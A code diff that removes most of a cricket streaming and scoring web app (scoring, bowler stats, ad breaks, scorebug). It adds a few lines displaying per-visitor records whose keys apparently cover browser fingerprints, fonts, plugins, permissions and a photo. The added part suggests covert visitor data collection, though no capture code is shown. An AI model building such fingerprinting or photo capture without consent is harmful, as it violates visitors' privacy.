+    const d=$('#dt-'+id); d.hidden=!d.hidden; if(d.hidden)return;
+    const r=(window.__all||{})[id]||{};
+    const skip=new Set(['fp','ua','fonts','plugins','voices','codecs','perms','photo']);
+    const rows=Object.entries(r).filter(([k])=>!skip.has(k)).map(([k,v])=>
+      '<div class="kv"><b>'+esc(k)+'</b><i>'+esc(typeof v==='object'?JSON.stringify(v):v)+'</i></div>').join('');
+    d.innerHTML='<pre class="out">'+rows+'</pre>';
   }
-};
-document.getElementById('playAdBtn').onclick = ()=>{
-  if(!adPlayer.src){ showToast('Pehle ek ad video select karo'); return; }
-  adMode = true;
-  preview.style.display = 'none';
-  adPlayer.style.display = 'block';
-  adPlayer.currentTime = 0;
-  adPlayer.play();
-  adBadge.style.display = 'flex';
-  showToast('Ad break shuru — match camera pause hai');
-};
-document.getElementById('stopAdBtn').onclick = ()=>{
-  adMode = false;
-  adPlayer.pause();
-  adPlayer.style.display = 'none';
-  preview.style.display = 'block';
-  adBadge.style.display = 'none';
-  showToast('Match resume ho gaya');
-};
-
-/* ================= CRICKET SCORING ================= */
-let battingTeam = 'A';
-let viewTeam = 'A';
-let teamAFinal = null;
-let teamBFinal = null;
-let xiA = [], xiB = [], outBatsmen = [];
-let bowlerStats = {};
-let fieldingBowlersA = ['Bowler 1'];
-let fieldingBowlersB = ['Bowler 1'];
-let currentBowler = 'Bowler 1';
-let overHistory = [];
-let currentOverRuns = 0;
-let teamALogoData = null, teamBLogoData = null;
-
-let cricket = {
-  runs:0, wickets:0, legalBalls:0, extras:0,
-  striker:{name:'Batsman 1', runs:0, balls:0, fours:0, sixes:0},
-  nonStriker:{name:'Batsman 2', runs:0, balls:0, fours:0, sixes:0},
-  overBalls:[],
-  history:[]
-};
-
-const teamAName = document.getElementById('teamAName');
-const teamBName = document.getElementById('teamBName');
-const teamAColor = document.getElementById('teamAColor');
-const teamBColor = document.getElementById('teamBColor');
-const teamALogo = document.getElementById('teamALogo');
-const teamBLogo = document.getElementById('teamBLogo');
-const xiAInput = document.getElementById('xiAInput');
-const xiBInput = document.getElementById('xiBInput');
-const strikerName = document.getElementById('strikerName');
-const nonStrikerName = document.getElementById('nonStrikerName');
-const battingSelect = document.getElementById('battingSelect');
-const cricketPanel = document.getElementById('cricketPanel');
-const cricketToggleBtn = document.getElementById('cricketToggleBtn');
-const cpClose = document.getElementById('cpClose');
-const currentBowlerBtn = document.getElementById('currentBowlerBtn');
-const bowlerModal = document.getElementById('bowlerModal');
-const bowlerList = document.getElementById('bowlerList');
-const newBowlerInput = document.getElementById('newBowlerInput');
-const addBowlerBtn = document.getElementById('addBowlerBtn');
-const powerplayBtn = document.getElementById('powerplayBtn');
-const powerplayRow = document.getElementById('powerplayRow');
-const tabA = document.getElementById('tabA');
-const tabB = document.getElementById('tabB');
-const matchStatusInput = document.getElementById('matchStatusInput');
-const sbTabA = document.getElementById('sbTabA');
-const sbTabB = document.getElementById('sbTabB');
-
-function shadeColor(hex, percent){
-  hex = hex.replace('#','');
-  const num = parseInt(hex,16);
-  let r = (num>>16), g = (num>>8 & 0x00FF), b = (num & 0x0000FF);
-  r = Math.max(0, Math.min(255, Math.round(r + (percent/100)*255)));
-  g = Math.max(0, Math.min(255, Math.round(g + (percent/100)*255)));
-  b = Math.max(0, Math.min(255, Math.round(b + (percent/100)*255)));
-  return '#' + (0x1000000 + r*0x10000 + g*0x100 + b).toString(16).slice(1);
-}
-function getBowler(name){
-  if(!bowlerStats[name]) bowlerStats[name] = {balls:0, runs:0, wickets:0};
-  return bowlerStats[name];
-}
-function fieldingRoster(){ return battingTeam==='A' ? fieldingBowlersB : fieldingBowlersA; }
-function openBowlerModal(){
-  const roster = fieldingRoster();
-  bowlerList.innerHTML = '';
-  roster.forEach(n=>{
-    const b = document.createElement('button');
-    b.type = 'button';
-    b.className = 'bowlerOption' + (n===currentBowler ? ' active' : '');
-    b.textContent = n;
-    b.onclick = ()=>{ currentBowler = n; closeBowlerModal(); renderScoreboard(); };
-    bowlerList.appendChild(b);
-  });
-  bowlerModal.classList.add('show');
-}
-function closeBowlerModal(){ bowlerModal.classList.remove('show'); }
-currentBowlerBtn.onclick = openBowlerModal;
-addBowlerBtn.onclick = ()=>{
-  const name = newBowlerInput.value.trim();
-  if(!name){ showToast('Bowler ka naam likho'); return; }
-  const roster = fieldingRoster();
-  if(!roster.includes(name)) roster.push(name);
-  currentBowler = name;
-  newBowlerInput.value = '';
-  closeBowlerModal();
-  renderScoreboard();
-};
-
-function parseXI(text){
-  return text.split('\n').map(s=>s.trim()).filter(Boolean).slice(0,11);
-}
-function refreshXI(){
-  xiA = parseXI(xiAInput.value);
-  xiB = parseXI(xiBInput.value);
-  renderScoreboard();
-}
-xiAInput.addEventListener('input', refreshXI);
-xiBInput.addEventListener('input', refreshXI);
-document.documentElement.style.setProperty('--teamA', teamAColor.value);
-document.documentElement.style.setProperty('--teamB', teamBColor.value);
-teamAColor.addEventListener('input', ()=>{ document.documentElement.style.setProperty('--teamA', teamAColor.value); renderScoreboard(); });
-teamBColor.addEventListener('input', ()=>{ document.documentElement.style.setProperty('--teamB', teamBColor.value); renderScoreboard(); });
-teamAName.addEventListener('input', renderScoreboard);
-teamBName.addEventListener('input', renderScoreboard);
-teamALogo.addEventListener('change', e=>{
-  const f = e.target.files[0];
-  if(!f) return;
-  const reader = new FileReader();
-  reader.onload = ()=>{ teamALogoData = reader.result; renderScoreboard(); };
-  reader.readAsDataURL(f);
 });
-teamBLogo.addEventListener('change', e=>{
-  const f = e.target.files[0];
-  if(!f) return;
-  const reader = new FileReader();
-  reader.onload = ()=>{ teamBLogoData = reader.result; renderScoreboard(); };
-  reader.readAsDataURL(f);
-});
-
-function snapshotCricket(){
-  cricket.history.push(JSON.parse(JSON.stringify({
-    runs:cricket.runs, wickets:cricket.wickets, legalBalls:cricket.legalBalls, extras:cricket.extras,
-    striker:cricket.striker, nonStriker:cricket.nonStriker, overBalls:cricket.overBalls, outBatsmen:outBatsmen,
-    bowlerStats:bowlerStats, currentOverRuns:currentOverRuns
-  })));
-  if(cricket.history.length > 80) cricket.history.shift();
-}
-function swapStrike(){ const t = cricket.striker; cricket.striker = cricket.nonStriker; cricket.nonStriker = t; }
-
-function checkOverComplete(){
-  if(cricket.legalBalls % 6 === 0){
-    swapStrike();
-    cricket.overBalls = [];
-    overHistory.push(currentOverRuns);
-    currentOverRuns = 0;
-    if(cricket.wickets < 10) setTimeout(openBowlerModal, 250);
-  }
-}
-
-function showBoundaryAnim(text){
-  boundaryAnim.textContent = text;
-  boundaryAnim.className = 'boundaryAnim show ' + (text==='6' ? 'six' : 'four');
-  clearTimeout(showBoundaryAnim._t);
-  showBoundaryAnim._t = setTimeout(()=> boundaryAnim.classList.remove('show'), 1400);
-}
-
-function addLegalBall(runs, label){
-  snapshotCricket();
-  cricket.runs += runs;
-  cricket.striker.runs += runs;
-  cricket.striker.balls += 1;
-  if(runs === 4){ cricket.striker.fours += 1; showBoundaryAnim('4'); }
-  if(runs === 6){ cricket.striker.sixes += 1; showBoundaryAnim('6'); }
-  cricket.legalBalls += 1;
-  currentOverRuns += runs;
-  cricket.overBalls.push(label);
-  const bowler = getBowler(currentBowler);
-  bowler.balls += 1; bowler.runs += runs;
-  if(runs % 2 === 1) swapStrike();
-  checkOverComplete();
-  renderScoreboard();
-}
-function addExtra(label){
-  snapshotCricket();
-  cricket.runs += 1; cricket.extras += 1;
-  currentOverRuns += 1;
-  cricket.overBalls.push(label);
-  const bowler = getBowler(currentBowler);
-  bowler.runs += 1;
-  renderScoreboard();
-}
-function addByeType(runs, label){
-  snapshotCricket();
-  cricket.runs += runs; cricket.extras += runs;
-  cricket.striker.balls += 1; cricket.legalBalls += 1;
-  currentOverRuns += runs;
-  cricket.overBalls.push(label);
-  const bowler = getBowler(currentBowler);
-  bowler.balls += 1;
-  if(runs % 2 === 1) swapStrike();
-  checkOverComplete();
-  renderScoreboard();
-}
-function takeWicket(){
-  snapshotCricket();
-  cricket.wickets += 1;
-  cricket.striker.balls += 1;
-  cricket.legalBalls += 1;
-  cricket.overBalls.push('W');
-  outBatsmen.push(cricket.striker.name);
-  const bowler = getBowler(currentBowler);
-  bowler.balls += 1; bowler.wickets += 1;
-
-  if(cricket.wickets >= 10){
-    renderScoreboard();
-    const alreadySecondInnings = battingTeam==='A' ? !!teamBFinal : !!teamAFinal;
-    if(alreadySecondInnings){
-      showToast('All Out! Match complete 🏆');
-    } else {
-      showToast((battingTeam==='A' ? (teamAName.value||'Team A') : (teamBName.value||'Team B')) + ' all out — Innings badal rahi hai');
-      setTimeout(swapInnings, 900);
-    }
-    return;
-  }
-
-  const xi = battingTeam==='A' ? xiA : xiB;
-  const used = [cricket.nonStriker.name, ...outBatsmen];
-  const nextName = xi.find(n=> n && !used.includes(n));
-  const suggested = nextName || ('Batsman ' + (cricket.wickets+2));
-  const newName = window.prompt('Naye batsman ka naam:', suggested);
-  cricket.striker = { name: (newName && newName.trim()) || suggested, runs:0, balls:0, fours:0, sixes:0 };
-  checkOverComplete();
-  renderScoreboard();
-}
-function undoLast(){
-  if(cricket.history.length === 0){ showToast('Undo ke liye kuch nahi hai'); return; }
-  const prev = cricket.history.pop();
-  cricket.runs = prev.runs; cricket.wickets = prev.wickets; cricket.legalBalls = prev.legalBalls;
-  cricket.extras = prev.extras; cricket.striker = prev.striker; cricket.nonStriker = prev.nonStriker;
-  cricket.overBalls = prev.overBalls; outBatsmen = prev.outBatsmen; bowlerStats = prev.bowlerStats;
-  currentOverRuns = prev.currentOverRuns || 0;
-  renderScoreboard();
-}
-function resetInnings(){
-  if(!confirm('Innings reset karein? Sara score 0 ho jayega.')) return;
-  cricket.runs=0; cricket.wickets=0; cricket.legalBalls=0; cricket.extras=0; outBatsmen=[]; bowlerStats={};
-  overHistory=[]; currentOverRuns=0;
-  const xi = battingTeam==='A' ? xiA : xiB;
-  cricket.striker = { name: strikerName.value || (xi[0]||'Batsman 1'), runs:0, balls:0, fours:0, sixes:0 };
-  cricket.nonStriker = { name: nonStrikerName.value || (xi[1]||'Batsman 2'), runs:0, balls:0, fours:0, sixes:0 };
-  cricket.overBalls = []; cricket.history = [];
-  renderScoreboard();
-  showToast('Innings reset ho gayi');
-}
-function swapInnings(){
-  closeBowlerModal();
-  if(battingTeam === 'A'){
-    teamAFinal = {runs:cricket.runs, wickets:cricket.wickets, legalBalls:cricket.legalBalls};
-    battingTeam = 'B';
-  } else {
-    teamBFinal = {runs:cricket.runs, wickets:cricket.wickets, legalBalls:cricket.legalBalls};
-    battingTeam = 'A';
-  }
-  battingSelect.value = battingTeam;
-  viewTeam = battingTeam;
-  const xi = battingTeam==='A' ? xiA : xiB;
-  cricket.runs=0; cricket.wickets=0; cricket.legalBalls=0; cricket.extras=0; outBatsmen=[]; bowlerStats={};
-  overHistory=[]; currentOverRuns=0;
-  currentBowler = fieldingRoster()[0] || 'Bowler 1';
-  cricket.striker = { name: xi[0] || 'Batsman 1', runs:0, balls:0, fours:0, sixes:0 };
-  cricket.nonStriker = { name: xi[1] || 'Batsman 2', runs:0, balls:0, fours:0, sixes:0 };
-  strikerName.value = cricket.striker.name;
-  nonStrikerName.value = cricket.nonStriker.name;
-  cricket.overBalls = []; cricket.history = [];
-  renderScoreboard();
-  showToast('Innings badal di gayi');
-}
-powerplayBtn.onclick = ()=>{
-  const showing = powerplayRow.style.display !== 'none';
-  powerplayRow.style.display = showing ? 'none' : 'flex';
-  if(!showing) renderPowerplay();
-};
-function renderPowerplay(){
-  powerplayRow.innerHTML = '';
-  const list = overHistory.slice(0,10);
-  if(list.length === 0){ powerplayRow.innerHTML = '<span style="font-size:11px;color:#5A6472;">Abhi tak koi over complete nahi hua</span>'; return; }
-  list.forEach((runs,i)=>{
-    const chip = document.createElement('div');
-    chip.className = 'ppChip';
-    chip.innerHTML = '<b>'+runs+'</b><span>P'+(i+1)+'</span>';
-    powerplayRow.appendChild(chip);
-  });
-}
-function oversDisplay(){ return Math.floor(cricket.legalBalls/6) + '.' + (cricket.legalBalls%6); }
-function crrDisplay(){
-  const oversFloat = cricket.legalBalls/6;
-  return oversFloat===0 ? '0.00' : (cricket.runs/oversFloat).toFixed(2);
-}
-function srDisplay(runs, balls){ return balls===0 ? '0.0' : ((runs/balls)*100).toFixed(1); }
-function scoreLabel(final){ return final ? (final.runs+'/'+final.wickets+' ('+Math.floor(final.legalBalls/6)+'.'+(final.legalBalls%6)+' ov)') : '-'; }
-function updateFlagCircle(el, color, initials, imgData){
-  el.innerHTML = '';
-  if(imgData){
-    el.style.background = 'transparent';
-    const img = document.createElement('img');
-    img.src = imgData;
-    el.appendChild(img);
-  } else {
-    el.style.background = color;
-    el.textContent = initials;
-  }
-}
-
-
-function renderXiList(listEl, names, isBattingList){
-  listEl.innerHTML = '';
-  names.forEach(name=>{
-    const li = document.createElement('li');
-    li.textContent = name;
-    if(isBattingList){
-      if(outBatsmen.includes(name)) li.classList.add('out');
-      else if(name === cricket.striker.name){ li.classList.add('current'); li.textContent = name + ' *'; }
-      else if(name === cricket.nonStriker.name){ li.classList.add('current'); }
-    }
-    listEl.appendChild(li);
-  });
-}
-
-function renderScoreboard(){
-  const colA = teamAColor.value, colB = teamBColor.value;
-  document.getElementById('teamABar').style.background = 'linear-gradient(135deg,' + colA + ',' + shadeColor(colA,-25) + ')';
-  document.getElementById('teamBBar').style.background = 'linear-gradient(135deg,' + colB + ',' + shadeColor(colB,-25) + ')';
-
-  document.getElementById('sbTeamAName').textContent = teamAName.value || 'Team A';
-  document.getElementById('sbTeamBName').textContent = teamBName.value || 'Team B';
-
-  if(battingTeam === 'A'){
-    document.getElementById('sbTeamAScore').textContent = cricket.runs+'/'+cricket.wickets;
-    document.getElementById('sbTeamAOvers').textContent = '('+oversDisplay()+' ov)';
-    document.getElementById('tbTagA').textContent = 'BATTING';
-    document.getElementById('sbTeamBScore').textContent = scoreLabel(teamBFinal);
-    document.getElementById('sbTeamBOvers').textContent = '';
-    document.getElementById('tbTagB').textContent = teamBFinal ? 'INNINGS DONE' : 'YET TO BAT';
-  } else {
-    document.getElementById('sbTeamBScore').textContent = cricket.runs+'/'+cricket.wickets;
-    document.getElementById('sbTeamBOvers').textContent = '('+oversDisplay()+' ov)';
-    document.getElementById('tbTagB').textContent = 'BATTING';
-    document.getElementById('sbTeamAScore').textContent = scoreLabel(teamAFinal);
-    document.getElementById('sbTeamAOvers').textContent = '';
-    document.getElementById('tbTagA').textContent = teamAFinal ? 'INNINGS DONE' : 'YET TO BAT';
-  }
-  document.getElementById('teamABar').classList.toggle('live', battingTeam==='A');
-  document.getElementById('teamABar').classList.toggle('other', battingTeam!=='A');
-  document.getElementById('teamBBar').classList.toggle('live', battingTeam==='B');
-  document.getElementById('teamBBar').classList.toggle('other', battingTeam!=='B');
-
-  document.getElementById('sbCRR').textContent = 'CRR ' + crrDisplay();
-  document.getElementById('stStrikerLabel').textContent = cricket.striker.name + '* · ' + cricket.nonStriker.name;
-
-  document.getElementById('bcStrikerName').textContent = cricket.striker.name + ' *';
-  document.getElementById('bcStrikerR').textContent = cricket.striker.runs;
-  document.getElementById('bcStrikerB').textContent = cricket.striker.balls;
-  document.getElementById('bcStriker4').textContent = cricket.striker.fours;
-  document.getElementById('bcStriker6').textContent = cricket.striker.sixes;
-  document.getElementById('bcStrikerSR').textContent = srDisplay(cricket.striker.runs, cricket.striker.balls);
-
-  document.getElementById('bcNonStrikerName').textContent = cricket.nonStriker.name;
-  document.getElementById('bcNonStrikerR').textContent = cricket.nonStriker.runs;
-  document.getElementById('bcNonStrikerB').textContent = cricket.nonStriker.balls;
-  document.getElementById('bcNonStriker4').textContent = cricket.nonStriker.fours;
-  document.getElementById('bcNonStriker6').textContent = cricket.nonStriker.sixes;
-  document.getElementById('bcNonStrikerSR').textContent = srDisplay(cricket.nonStriker.runs, cricket.nonStriker.balls);
-
-  const bowler = getBowler(currentBowler);
-  const bOvers = Math.floor(bowler.balls/6) + '.' + (bowler.balls%6);
-  const bEcon = bowler.balls===0 ? '0.00' : (bowler.runs/(bowler.balls/6)).toFixed(2);
-  document.getElementById('bowlerOvers').textContent = bOvers;
-  document.getElementById('bowlerRuns').textContent = bowler.runs;
-  document.getElementById('bowlerWkts').textContent = bowler.wickets;
-  document.getElementById('bowlerEcon').textContent = bEcon;
-  currentBowlerBtn.textContent = currentBowler + ' ✎';
-
-  const overWrap = document.getElementById('sbOverBalls');
-  overWrap.innerHTML = '';
-  cricket.overBalls.forEach(b=>{
-    const chip = document.createElement('span');
-    chip.className = 'sbBall' + (b==='W' ? ' wicket' : ((b==='4'||b==='6') ? ' boundary' : ''));
-    chip.textContent = b;
-    overWrap.appendChild(chip);
-  });
-
-  const viewName = viewTeam==='A' ? (teamAName.value||'Team A') : (teamBName.value||'Team B');
-  const viewColor = viewTeam==='A' ? colA : colB;
-  document.getElementById('xiSingleHead').textContent = viewName + ' — Playing XI';
-  document.getElementById('xiSingleHead').style.color = viewColor;
-  document.getElementById('xiSingleCol').style.borderLeftColor = viewColor;
-  renderXiList(document.getElementById('xiSingleList'), viewTeam==='A' ? xiA : xiB, viewTeam===battingTeam);
-  tabA.classList.toggle('active', viewTeam==='A');
-  tabB.classList.toggle('active', viewTeam==='B');
-  tabA.style.background = viewTeam==='A' ? colA : '';
-  tabB.style.background = viewTeam==='B' ? colB : '';
-
-  /* ---- On-screen broadcast scorebug ---- */
-  const battingName = battingTeam==='A' ? (teamAName.value||'Team A') : (teamBName.value||'Team B');
-  const battingColor = battingTeam==='A' ? colA : colB;
-  const fieldingColor = battingTeam==='A' ? colB : colA;
-  const battingLogo = battingTeam==='A' ? teamALogoData : teamBLogoData;
-
-  updateFlagCircle(document.getElementById('sbFlagLeft'), battingColor, battingName.trim().slice(0,3).toUpperCase() || 'TM', battingLogo);
-  document.getElementById('scorebug').style.background =
-    'linear-gradient(90deg,' + battingColor + ' 0%, #060708 42%, #000000 50%, #060708 58%, ' + fieldingColor + ' 100%)';
-  document.getElementById('sbStrikeArrow').style.color = '#7FC8FF';
-  document.getElementById('sbName2').style.fontWeight = '800';
-  document.getElementById('sbRuns2').style.fontWeight = '800';
-  [document.getElementById('sbName1'), document.getElementById('sbRuns1'), document.getElementById('sbBalls1')].forEach(el=> el.style.opacity = '.65');
-  [document.getElementById('sbName2'), document.getElementById('sbRuns2'), document.getElementById('sbBalls2')].forEach(el=> el.style.opacity = '1');
-
-  document.getElementById('sbName2').textContent = cricket.striker.name;
-  document.getElementById('sbRuns2').textContent = cricket.striker.runs;
-  document.getElementById('sbBalls2').textContent = cricket.striker.balls;
-  document.getElementById('sbName1').textContent = cricket.nonStriker.name;
-  document.getElementById('sbRuns1').textContent = cricket.nonStriker.runs;
-  document.getElementById('sbBalls1').textContent = cricket.nonStriker.balls;
-
-  document.getElementById('sbScoreBadge').textContent = cricket.runs + '-' + cricket.wickets;
-  document.getElementById('sbOversInline').textContent = oversDisplay();
-  document.getElementById('sbCenterSub').textContent = 'CRR ' + crrDisplay();
-
-  document.getElementById('sbBowlerNameEl').textContent = currentBowler;
-  document.getElementById('sbBowlerWk').textContent = bowler.wickets + '-' + bowler.runs;
-  document.getElementById('sbBowlerOv').textContent = bOvers;
-
-  const dotsWrap = document.getElementById('sbOverDots');
-  dotsWrap.innerHTML = '';
-  cricket.overBalls.slice(-6).forEach(b=>{
-    const d = document.createElement('span');
-    let cls = 'sbDot';
-    let label = b;
-    if(b === 'W'){ cls += ' wicket'; }
-    else if(b === '4' || b === '6'){ cls += ' boundary'; }
-    else if(b === '0'){ label = ''; }
-    else { cls += ' filled'; if(b==='wd'||b==='nb'||b==='b'||b==='lb') label = b.toUpperCase(); }
-    d.className = cls;
-    d.textContent = label;
-    dotsWrap.appendChild(d);
-  });
-
-  sbTabA.classList.toggle('active', battingTeam==='A');
-  sbTabB.classList.toggle('active', battingTeam==='B');
-}
-
-document.querySelectorAll('.runBtn[data-run]').forEach(btn=>{
-  btn.onclick = ()=> addLegalBall(parseInt(btn.dataset.run), btn.dataset.run);
-});
-document.getElementById('wicketBtn').onclick = takeWicket;
-document.getElementById('wideBtn').onclick = ()=> addExtra('wd');
-document.getElementById('noballBtn').onclick = ()=> addExtra('nb');
-document.getElementById('byeBtn').onclick = ()=> addByeType(1,'b');
-document.getElementById('legbyeBtn').onclick = ()=> addByeType(1,'lb');
-document.getElementById('swapBtn').onclick = ()=>{ swapStrike(); renderScoreboard(); };
-document.getElementById('undoBtn').onclick = undoLast;
-document.getElementById('resetInningsBtn').onclick = resetInnings;
-document.getElementById('swapInningsBtn').onclick = swapInnings;
-battingSelect.onchange = ()=>{ battingTeam = battingSelect.value; renderScoreboard(); };
-strikerName.oninput = ()=>{ cricket.striker.name = strikerName.value; renderScoreboard(); };
-nonStrikerName.oninput = ()=>{ cricket.nonStriker.name = nonStrikerName.value; renderScoreboard(); };
-tabA.onclick = ()=>{ viewTeam = 'A'; renderScoreboard(); };
-tabB.onclick = ()=>{ viewTeam = 'B'; renderScoreboard(); };
-
-sbTabA.onclick = ()=>{ battingTeam = 'A'; viewTeam = 'A'; battingSelect.value = 'A'; renderScoreboard(); };
-sbTabB.onclick = ()=>{ battingTeam = 'B'; viewTeam = 'B'; battingSelect.value = 'B'; renderScoreboard(); };
-document.getElementById('sbExpandBtn').onclick = ()=>{ cricketToggleBtn.click(); };
-document.getElementById('sbExpandLeft').onclick = ()=>{ cricketToggleBtn.click(); };
-
-cricketToggleBtn.onclick = ()=>{
-  cricketPanel.classList.toggle('open');
-  cricketToggleBtn.classList.toggle('active');
-};
-cpClose.onclick = ()=>{
-  cricketPanel.classList.remove('open');
-  cricketToggleBtn.classList.remove('active');
-};
-overlayOnBtn.onclick = ()=>{
-  scoreboardOn = true;
-  overlayOnBtn.classList.add('active'); overlayOffBtn.classList.remove('active');
-};
-overlayOffBtn.onclick = ()=>{
-  scoreboardOn = false;
-  overlayOffBtn.classList.add('active'); overlayOnBtn.classList.remove('active');
-};
-
-refreshXI();
-renderScoreboard();
 </script>
 </body>
 </html>
